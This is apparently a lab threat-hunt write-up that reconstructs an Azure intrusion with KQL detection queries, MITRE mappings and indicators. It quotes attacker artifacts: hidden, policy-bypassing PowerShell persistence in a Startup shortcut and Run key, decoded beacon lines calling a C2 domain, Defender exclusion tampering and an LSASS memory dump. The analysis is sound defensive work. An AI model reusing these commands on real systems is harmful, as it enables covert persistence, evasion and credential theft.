# Threat Hunt: Signal After The Noise

![Mission Brief](assets/mission-brief.png)

## Overview

A post-intrusion threat hunt inside a corporate Azure estate. The breach was already established — this hunt reconstructed **the full operator playbook after access was gained**: how they moved laterally, deployed tooling, silenced defenses, established persistent C2, dumped credentials, and confirmed live desktop access.

**Environment:** Microsoft Sentinel / Microsoft Defender for Endpoint (MDE)  
**Date of Activity:** December 13, 2025  
**Platform:** Azure — `LAW-Cyber-Range` Sentinel workspace  
**Analyst:** Abel

---

## Environment

| Component | Details |
|---|---|
| SIEM | Microsoft Sentinel |
| EDR | Microsoft Defender for Endpoint (MDE) |
| Log Sources | DeviceLogonEvents, DeviceProcessEvents, DeviceFileEvents, DeviceNetworkEvents, DeviceRegistryEvents, DeviceEvents |
| Entry host | `azwks-phtg-02` |
| Pivot host | `azwks-phtg-01` |
| Operator account | `vmadminusername` |

---

## Attack Chain

### Initial Access — Credential Reuse from a Compromised Workstation

At **09:27:58 UTC**, `vmadminusername` authenticated to `azwks-phtg-02` from `173.244.55.131` — the IP of `sarah-chen`'s workstation. Pre-logon failure events show `UnauthorizedLogonType`, not wrong passwords — the credentials were valid from the first attempt. No brute force, no spray. `sarah-chen`'s machine is not a relay — it is the operator's external launch point.

```kql
// Trace the external logon and confirm sarah-chen as the launch point
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13T09:40:00Z) .. datetime(2025-12-13T18:00:00Z))
| where RemoteDeviceName contains "sarah"
| project TimeGenerated, DeviceName, AccountName, LogonType, RemoteIP, RemoteDeviceName
| order by TimeGenerated asc
```

![P01 — Cold Trail](assets/p01-cold-trail.png)

```kql
// Confirm no brute force — failed logons show UnauthorizedLogonType, not bad credentials
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T09:28:00Z))
| where DeviceName == "azwks-phtg-02"
| where ActionType == "LogonFailed"
| project TimeGenerated, AccountName, LogonType, RemoteIP, FailureReason
| order by TimeGenerated asc
```

![Q01 — Brute Force Assumption](assets/q01-brute-force-assumption.png)

**MITRE:** T1078 — Valid Accounts

---

### Lateral Movement — Pre-Staged RDP File

**21 minutes after entry**, at 09:48 UTC, the operator launched a pre-staged RDP file already on disk in the Downloads folder — a planned pivot to a specific second target, not exploratory movement. `CredentialUIBroker` fired immediately after `mstsc.exe`. No further lateral movement beyond `azwks-phtg-01` was detected.

```kql
// Find the pre-staged RDP file launch on the entry host
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T09:27:00Z) .. datetime(2025-12-13T10:00:00Z))
| where DeviceName == "azwks-phtg-02"
| where AccountName == "vmadminusername"
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

![P02 — First Footsteps](assets/p02-first-footsteps.png)

```kql
// Confirm the logon to the pivot host and check for onward movement
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
| where RemoteIP == "10.0.0.152"
| project TimeGenerated, DeviceName, AccountName, LogonType, RemoteIP, RemoteDeviceName
| order by TimeGenerated asc
```

![Q02 — Lateral Movement](assets/q02-lateral-movement.png)

**MITRE:** T1021.001 — Remote Services: Remote Desktop Protocol

---

### Tooling Deployment — Download-Then-Execute

A pre-staged `_.ps1` script made an outbound HTTPS call to `updates.health-cloud.cc`. **One second later**, `PHtGHealthCloudSvc.exe` launched — classic download-then-execute. All tooling staged under `C:\ProgramData\PHTG\HealthCloud\`. The implant spoofed `bitsadmin.exe` via VersionInfo tampering — `FileName` is `PHtGHealthCloudSvc.exe` but `ProcessVersionInfoOriginalFileName` reports `bitsadmin.exe`. Its staging path under `C:\ProgramData\PHTG\HealthCloud\` distinguishes it from any legitimate binary with a mismatched VersionInfo field. All PowerShell execution used `-WindowStyle Hidden -ExecutionPolicy Bypass`.

```kql
// Find the first operator script and expose the concealment flags
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T09:48:00Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where AccountName == "vmadminusername"
| where FileName == "powershell.exe"
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
| take 1
```

![Q04 — First Operator Script](assets/q04-first-operator-script.png)

```kql
// Identify the LOLBin masquerade — FileName differs from OriginalFileName in the operator's binary
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where AccountName == "vmadminusername"
| where FileName != ProcessVersionInfoOriginalFileName
| where ProcessVersionInfoOriginalFileName != ""
| project TimeGenerated, FileName, ProcessVersionInfoOriginalFileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated desc
```

![Q08 — LOLBin Masquerade](assets/q08-lolbin-masquerade.png)

```kql
// Confirm the download-then-execute pattern — outbound call 1 second before binary launch
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T10:12:00Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc
```

![Q18 — Deployment Pattern](assets/q18-deployment-pattern.png)

**MITRE:** T1105 — Ingress Tool Transfer, T1036.003 — Masquerading: Rename System Utilities, T1059.001 — PowerShell, T1564.003 — Hidden Window

---

### Defense Evasion — Silencing Defender Before Persistence Lands

The operator ran `AMSI_probe.ps1` to confirm the environment was safe, then briefly excluded the PHTG user-profile path via `Add-MpPreference` — removed within seconds, just long enough for the payload to drop. After persistence landed, two permanent exclusions were added via `msmpeng.exe`. Defender detected `PHTG HealthCloud.lnk` but `WasExecutingWhileDetected: false` confirms it didn't block. `attrib.exe` hid files across `Cache` (17 hits) and `TempCache` (2 hits). Two `cmd.exe` invocations broke parent-process lineage.

```kql
// Confirm Defender exclusions written via msmpeng.exe
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where RegistryKey contains "Defender"
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName
| order by TimeGenerated asc
```

![P06 — Doors Held Open](assets/p06-doors-held-open.png)

```kql
// Find attrib.exe usage and count modifications per staging directory
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where FileName == "attrib.exe"
| extend Dir = case(
    ProcessCommandLine contains "\\Cache\\", "Cache",
    ProcessCommandLine contains "\\TempCache\\", "TempCache",
    "other")
| summarize Count = count() by Dir
| order by Count desc
```

![Q07 — Attrib Commands](assets/q07-attrib-commands.png)

```kql
// Surface the AMSI probe from the non-encoded PowerShell scripts in the Bin directory
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T10:12:00Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where FileName == "powershell.exe"
| where ProcessCommandLine !contains "-EncodedCommand"
| where ProcessCommandLine contains "Bin"
| project TimeGenerated, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

![Q20 — AMSI Probe](assets/q20-amsi-probe.png)

```kql
// Detect the permanent Defender exclusions added after persistence
DeviceEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13T09:48:40Z) .. datetime(2025-12-13T18:00:00Z))
| where ActionType == "PowerShellCommand"
| where AdditionalFields contains "Add-MpPreference"
| project TimeGenerated, AdditionalFields
| order by TimeGenerated asc
```

![Q22 — Defender Tampering](assets/q22-defender-tampering.png)

```kql
// Prove the add-then-remove pattern on the temporary exclusion
DeviceEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13T10:11:00Z) .. datetime(2025-12-13T10:12:30Z))
| where ActionType == "PowerShellCommand"
| where AdditionalFields contains "MpPreference"
| project TimeGenerated, AdditionalFields
| order by TimeGenerated asc
```

![Q24 — Temp Exclusion Add](assets/q24-temp-exclusion-add.png)

**MITRE:** T1562.001 — Impair Defenses: Disable or Modify Tools, T1564 — Hide Artifacts, T1059.003 — Windows Command Shell

---

### Persistence — Three Mechanisms

All three mechanisms installed at **10:13 UTC** — 25 minutes after landing on `azwks-phtg-01`.

**1. Startup LNK — fires at every user logon**
```powershell
C:\Users\vmAdminUsername\AppData\...\Startup\PHTG HealthCloud.lnk
→ PowerShell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\PHTG\HealthCloud\Cache\task_FLAG-05.ps1
```

**2. Run Key — independent logon-triggered path**
```
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Value: PHTGHealthCloudTray
Data:  powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\PHTG\HealthCloud\Bin\HealthCloudTray.ps1"
```

**3. HKLM EventLog Registration — blends implant writes into trusted Application log telemetry**
```
HKLM\SYSTEM\ControlSet001\Services\EventLog\Application\PHTGHealthCloud
```

```kql
// Find the Startup LNK creation
DeviceFileEvents
| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where FolderPath contains "Startup"
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

![P03 — Quiet Roots](assets/p03-quiet-roots.png)
![Q13 — Startup LNK](assets/q13-startup-lnk.png)

```kql
// Isolate the operator's Run key entry from the background OS churn
DeviceRegistryEvents
| where TimeGenerated > datetime(2025-12-13T09:48:00Z)
| where DeviceName == "azwks-phtg-01"
| where InitiatingProcessAccountName =~ "vmadminusername"
| where RegistryKey !contains "CLSID"
| where RegistryKey !contains "MuiCache"
| where RegistryKey !contains "Themes"
| where RegistryKey contains "Run" or RegistryKey contains "Startup" or RegistryKey contains "Services"
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData
| order by TimeGenerated asc
```

![Q10 — Persistence Signal](assets/q10-persistence-signal.png)
![Q11 — Run Key Value](assets/q11-run-key-value.png)

```kql
// Confirm the HKLM EventLog source registration
DeviceRegistryEvents
| where TimeGenerated > datetime(2025-12-13T09:48:00Z)
| where DeviceName == "azwks-phtg-01"
| where InitiatingProcessAccountName =~ "vmadminusername"
| where RegistryKey startswith "HKEY_LOCAL_MACHINE"
| project TimeGenerated, ActionType, RegistryKey, RegistryValueName, RegistryValueData
| order by TimeGenerated asc
```

![Q14 — HKLM Registry](assets/q14-hklm-registry.png)

**MITRE:** T1547.001 — Registry Run Keys / Startup Folder, T1112 — Modify Registry

---

### Command & Control — Dual Beacons, Cloudflare-Fronted

**Channel 1 — implant healthcheck loop:** `PHtGHealthCloudSvc.exe` (masquerading as `bitsadmin.exe`) fired **22 healthcheck executions** to confirm liveness.

**Channel 2 — Base64-encoded PowerShell beacons** decoded via `base64_decode_tostring()` in KQL:
```powershell
Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/checkin?device=azwks-phtg-01" -UseBasicParsing -TimeoutSec 5 | Out-Null
Invoke-WebRequest -Uri "https://status.health-cloud.cc/api/status?device=azwks-phtg-01"  -UseBasicParsing -TimeoutSec 5 | Out-Null
```

Both resolved to Cloudflare-fronted IPs over 443/TLS. Dual-channel: if one is cut, the other survives; each serves a distinct function (liveness vs. tasking).

```kql
// Count healthcheck beacon executions
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where ProcessVersionInfoOriginalFileName =~ "bitsadmin.exe"
| count
```

![Q15 — Healthcheck Loop](assets/q15-healthcheck-loop.png)

```kql
// Surface the encoded PowerShell beacons
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T09:00:00Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where ProcessCommandLine contains "EncodedCommand"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc
```

![P04 — Beacon Pair](assets/p04-beacon-pair.png)
![Q16 — Encoded Beacons](assets/q16-encoded-beacons.png)

```kql
// Confirm resolved IPs and ports for both C2 subdomains
DeviceNetworkEvents
| where TimeGenerated between (datetime(2025-12-13T10:12:00Z) .. datetime(2025-12-13T10:16:00Z))
| where DeviceName == "azwks-phtg-01"
| where RemoteUrl contains "health-cloud" or RemoteIP != ""
| project TimeGenerated, DeviceName, ActionType, RemoteIP, RemoteUrl, RemotePort, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

![P05 — Outbound Whispers](assets/p05-outbound-whispers.png)

**MITRE:** T1071.001 — Application Layer Protocol: Web Protocols, T1027 — Obfuscated Files, T1090 — Proxy

---

### Credential Access — LSASS Memory Read

Among 139 `OpenProcessApiCall` events on `lsass.exe`, one stood out: `powershell.exe` under `vmadminusername`. Two access requests fired one second apart — the second was `0x1FFFFF` (`PROCESS_ALL_ACCESS`). A `ReadProcessMemoryApiCall` confirmed the dump followed through.

```kql
// Isolate the non-baseline LSASS handle request
DeviceEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13T09:48:40Z) .. datetime(2025-12-13T18:00:00Z))
| where ActionType == "OpenProcessApiCall"
| where FileName == "lsass.exe"
| where InitiatingProcessAccountName != "system"
| where InitiatingProcessAccountName != "network service"
| where InitiatingProcessAccountName != "local service"
| project TimeGenerated, InitiatingProcessFileName, InitiatingProcessAccountName, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

![Q27 — LSASS Access](assets/q27-lsass-access.png)

```kql
// Decode both DesiredAccess values — 0x1FFFFF is PROCESS_ALL_ACCESS
DeviceEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13T09:48:40Z) .. datetime(2025-12-13T18:00:00Z))
| where ActionType == "OpenProcessApiCall"
| where FileName == "lsass.exe"
| where InitiatingProcessAccountName == "vmadminusername"
| project TimeGenerated, AdditionalFields
| order by TimeGenerated asc
```

![Q28 — Access Rights](assets/q28-access-rights.png)

```kql
// Confirm the memory read followed the handle — dump confirmed
DeviceEvents
| where DeviceName == "azwks-phtg-01"
| where TimeGenerated between (datetime(2025-12-13T09:48:40Z) .. datetime(2025-12-13T18:00:00Z))
| where FileName == "lsass.exe"
| summarize count() by ActionType
```

![Q29 — Memory Read](assets/q29-memory-read.png)

**MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory

---

### Final Actions — M365 Targeting + Confirmed Live Access

`phtg_activity.ps1` drove Edge to `login.microsoftonline.com` repeatedly. Persistence confirmed firing at **13:40 UTC** without an active RDP session — the Startup LNK and Run key mechanisms triggering autonomously. At **15:55 UTC**, `notepad.exe`, `calc.exe`, and `mspaint.exe` launched interactively — live desktop access confirmed, nearly 6.5 hours after initial entry.

```kql
// Trace final operator actions on the pivot host
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-12-13T10:30:00Z) .. datetime(2025-12-13T18:00:00Z))
| where DeviceName == "azwks-phtg-01"
| where AccountName == "vmadminusername"
| project TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated asc
```

![P07 — M365 Auth](assets/p07-m365-auth.png)
![P07 — Scheduled Task](assets/p07-scheduled-task.png)
![P07 — Hands on Keyboard](assets/p07-hands-on-keyboard.png)

**MITRE:** T1078.004 — Valid Accounts: Cloud Accounts

---

## IOC Summary

| Type | Value |
|---|---|
| External IP | `173.244.55.131` (sarah-chen) |
| Entry host | `azwks-phtg-02` |
| Pivot host | `azwks-phtg-01` |
| Operator account | `vmadminusername` |
| C2 domain | `health-cloud.cc` |
| C2 subdomain | `updates.health-cloud.cc` |
| C2 subdomain | `status.health-cloud.cc` |
| C2 IP | `104.21.36.232` (Cloudflare-fronted) |
| C2 IP | `172.67.200.204` (Cloudflare-fronted) |
| Implant path | `C:\ProgramData\PHTG\HealthCloud\` |
| Implant binary | `PHtGHealthCloudSvc.exe` (masquerades as `bitsadmin.exe`) |
| Startup LNK | `PHTG HealthCloud.lnk` |
| Run key value | `PHTGHealthCloudTray` |

---

## Full Hunt Notes

For the complete phase-by-phase and question-by-question KQL walkthrough, see [hunt-notes.md](hunt-notes.md).

**Key skills demonstrated:** KQL threat hunting across 6 MDE/Sentinel tables, C2 infrastructure analysis and Base64 decoding, persistence mechanism identification (LNK + Run key + HKLM), Defender evasion detection, LSASS credential dump confirmation, MITRE ATT&CK mapping (T1003, T1021, T1027, T1036, T1059, T1071, T1078, T1090, T1105, T1112, T1547, T1562, T1564).
